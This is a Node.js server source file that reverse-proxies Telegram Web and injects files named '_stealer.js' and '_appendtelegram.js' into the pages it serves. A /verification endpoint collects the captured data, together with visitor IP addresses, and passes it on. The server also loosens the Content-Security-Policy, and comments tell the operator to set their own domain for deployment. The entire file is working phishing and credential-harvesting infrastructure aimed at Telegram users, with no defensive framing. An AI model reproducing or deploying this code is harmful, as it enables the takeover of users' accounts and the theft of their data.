const http = require("http");
const fs = require("fs");
const { isMainThread, parentPort } = require("worker_threads");
const port = process.env.PORT || 80; // Dynamic for Render

let stealerData, telegramAppend;
try {
    stealerData = fs.readFileSync("_stealer.js").toString();
    telegramAppend = fs.readFileSync("_appendtelegram.js").toString();
} catch (err) {
    console.error("Error reading stealer/append files:", err);
    process.exit(1); // Fail fast for demo setup
}

const logsPath = "/verification";

if (isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");

/**
 * Ends a response with a status code
 * 
 * @param {http.ServerResponse<http.IncomingMessage>} res 
 * @param {number} code 
 */
function endResponseWithCode(res, code) {
    res.statusCode = code;
    res.end();
}

/**
 * Converts `Headers` to a JSON object
 * 
 * @param {Headers} headers
 * @param {http.ServerResponse} res
 */
async function getHeaderObjects(headers, res) {
    const entries = headers.entries();
    while (true) {
        const entry = entries.next().value;
        if (entry == undefined) break;
        res.setHeader(entry[0], entry[1]);
    }
}

http.createServer(async (req, res) => {
    let body = "";
    req.on("data", (data) => body += data);

    req.on("end", async () => {
        try {
            if (req.url == undefined || !req.url.includes("/")) return endResponseWithCode(res, 401);
            console.log(req.url);
            const connectingIp = req.headers["cf-connecting-ip"] || req.socket.remoteAddress; // Fallback for non-CF

            if (req.method == "POST" && req.url == logsPath) {
                const parsedBody = JSON.parse(body);
                if (parsedBody == undefined) return endResponseWithCode(res, 401);

                parentPort.postMessage({
                    type: "verification",
                    data: parsedBody,
                    ip: connectingIp
                });

                return endResponseWithCode(res, 200);
            }

            if ((req.url.split("/").length == 2 && req.url.split("/")[1].length == 128) || req.url.startsWith("/?tgWebAppStartParam=")) {
                res.write(`<script src="https://telegram.org/js/telegram-web-app.js"></script><script>${stealerData}</script>`); // Fixed typo
                return endResponseWithCode(res, 200);
            } else {
                const headersEntries = Object.entries(req.headers);
                const headers = new Headers();
                for (let i = 0; i < headersEntries.length; i++) {
                    const entry = headersEntries[i];
                    headers.set(entry[0], entry[1].replaceAll("your-domain.com", "web.telegram.org")); // Change to your Render domain if needed
                }

                headers.set("Accept-Encoding", "br");

                const r = await fetch(new Request("https://web.telegram.org/k" + req.url, {
                    method: req.method,
                    headers: headers,
                    body: (req.method == "GET" || req.method == "HEAD") ? undefined : body
                }));

                if (!r.ok) throw new Error(`Fetch error: ${r.status}`);

                const resHeaders = new Headers(r.headers);

                resHeaders.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
                resHeaders.set('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline' your-domain.com"); // Change to your domain
                resHeaders.set('CF-Cache-Status', 'DYNAMIC');
                resHeaders.set('Pragma', 'no-cache');
                resHeaders.set('Expires', '0');

                let writeBody = await r.arrayBuffer();
                if (req.url == "/" || req.url.startsWith("/?")) {
                    writeBody = new TextDecoder().decode(writeBody).replace('<head>', `<head><script src="https://telegram.org/js/telegram-web-app.js"></script><script>${telegramAppend}</script>`); // Fixed typo
                }

                await getHeaderObjects(resHeaders, res);

                res.statusCode = r.status;
                res.statusMessage = r.statusText;
                return res.write(Buffer.from(writeBody), (_) => res.end());
            }
        } catch (err) {
            console.error("Server error:", err);
            endResponseWithCode(res, 500);
        }
    });
}).listen(port, () => {
    console.log(`Listening on ${port}`);
});

process.on("uncaughtException", console.error);
process.on("unhandledRejection", console.error);
